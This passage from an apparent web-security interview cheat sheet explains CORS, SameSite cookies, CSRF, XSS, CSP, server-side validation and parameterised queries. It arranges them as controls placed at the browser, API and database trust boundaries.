Cookie theft via JavaScript (XSS reading document.cookie). It does not stop CSRF.

What is CSP and how does it help against XSS?

A response header telling the browser which sources of script/style/etc are allowed. Even if an attacker injects a script tag, the browser refuses to execute it if CSP doesn't allow that source or nonce.

Stored vs reflected vs DOM XSS?

Stored — payload persisted in DB, delivered on every render. Reflected — payload in URL, echoed back by the server. DOM — payload consumed by client-side JS that writes it into the DOM unsafely.

Why is server-side validation required if the frontend already validates?

Because the frontend can be bypassed by any HTTP client. Client validation is UX; server validation is the security boundary.

How do parameterised queries prevent SQL injection?

The SQL text is sent to the DB with placeholders; the parameter values are bound separately. The DB parses SQL first and never treats the values as code — quoting/escaping bugs become impossible.

Where should CORS be configured?

In exactly one layer — usually the API Gateway. Duplicate headers from multiple layers are the #1 debugging pain.

Can I avoid CORS completely?

Yes — serve UI and API from the same origin via a reverse proxy. But you still need auth, authZ, CSRF, XSS, and input-validation controls.

How do you secure UI → API → DB end-to-end?

Browser: HTTPS + HSTS + CSP + SameSite cookies. UI: framework auto-escape, no unsafe HTML rendering. UI↔API: explicit CORS allow-list, authN, object-level authZ, CSRF token, server-side validation. API↔DB: private network, TLS, least-priv DB user, parameterised queries. Plus WAF, rate limiting, and audit logs on top.

🗣️ Interview cheat sheet — the 3–5 minute answer

Open with the picture. "Every three-tier app has three trust boundaries: browser → UI, UI → API, API → DB. Different security concepts live at different boundaries — one of the biggest mistakes I see is treating them as one bucket. Let me walk through them in the order a request travels."

Origin, SOP, CORS. "An origin is scheme + host + port. Same-Origin Policy is a browser rule that stops JavaScript on one origin from reading responses from another. CORS is the server's opt-in relaxation — Access-Control-Allow-Origin plus friends. Enforced by the browser, not the server, which is exactly why Postman doesn't show CORS errors. For any non-simple request the browser sends an OPTIONS preflight first."

Cookies, SameSite, CSRF. "Cookies auto-attach on same-site requests. That auto-attach is what CSRF abuses — evil.com posts a form to bank.com and the cookie tags along. Defences: SameSite=Lax kills most of it automatically, a per-session anti-CSRF token defeats the rest, and origin validation is the belt. Note SameSite is scheme + registrable-domain, so portal.example.com and api.example.com are different origin but same site."

XSS and CSP. "XSS is worse than CORS violations because the attacker's script runs as your origin — SOP now trusts it. Prevention is context-aware output encoding, framework auto-escape you don't bypass, and HTML sanitizer for rich-text. CSP is defense in depth: a header telling the browser only these script sources or this nonce may execute. It doesn't replace encoding, it shrinks the damage."

Server-side controls. "CORS is not authentication. Every endpoint must authN (session cookie or JWT), authZ including object-level checks so you don't get IDOR, validate input server-side even if the client did, and reach the DB with parameterised queries under a least-privilege DB user. Bonus: security headers — HSTS, X-Content-Type-Options, Referrer-Policy — set once at the edge."

Close with the mental model. "CORS controls cross-origin reads. CSRF prevents forged writes. XSS is attacker script inside a trusted origin. CSP is a browser-side safety net. AuthN is who, AuthZ is what. Input validation is shape. Parameterised queries are the DB boundary. Different boundaries, different controls — that's the whole picture."

5 talking points that win the round

  • Concept-to-boundary map. Say the trust boundaries out loud and place each control on one. Instant credibility.
  • "CORS is not authentication." Say it before the interviewer has to.
  • SameSite vs Same-Origin. Getting the site-vs-origin distinction right marks a senior candidate.
  • HttpOnly does not stop CSRF. The follow-up question everyone gets wrong.
